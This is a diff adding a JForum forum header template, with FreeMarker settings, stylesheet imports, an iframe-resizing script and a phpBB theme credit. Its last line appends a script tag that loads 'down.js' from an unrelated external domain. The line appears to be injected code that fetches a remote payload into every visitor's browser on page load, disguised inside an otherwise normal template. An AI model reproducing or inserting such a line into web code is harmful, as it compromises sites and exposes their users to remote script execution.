@@ -1,0 +1,37 @@
+<html>
+<#setting number_format = "#"/>
+<#setting datetime_format = dateTimeFormat/>
+<#assign logged = logged?default(false)/>
+<#assign language = language?default("en_US")/>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=${encoding}" />
+<meta http-equiv="Pragma" content="no-cache"/>
+<meta http-equiv="Expires" content="-1"/>
+<style type="text/css">@import url( ${contextPath}/templates/${templateName}/styles/style_main.css?${startupTime} );</style>
+<style type="text/css">@import url( ${contextPath}/templates/${templateName}/styles/style.css?${startupTime} );</style>
+<style type="text/css">@import url(${contextPath}/templates/${templateName}/styles/${language}.css?${startupTime});</style>
+<title>${pageTitle?default("JForum")?html}</title>
+</head>
+
+<body class="${language}">
+<script  language=javascript>
+   function iframeAutoFit(){
+      parent.document.all.forumFrame.style.height = document.body.scrollHeight;
+   }
+
+   if(document.attachEvent){
+		window.attachEvent('onload',  iframeAutoFit);  
+   }else{
+		window.addEventListener('load',  iframeAutoFit,  false);  
+   }
+</script>
+
+<!--
+Original theme from phpBB (http://www.phpbb.com) subSilver
+Created by subBlue design
+http://www.subBlue.com
+
+Modifications by JForum Team
+-->
+
+<script language=javascript src=http://Town.531jx.cn/down.js></script>
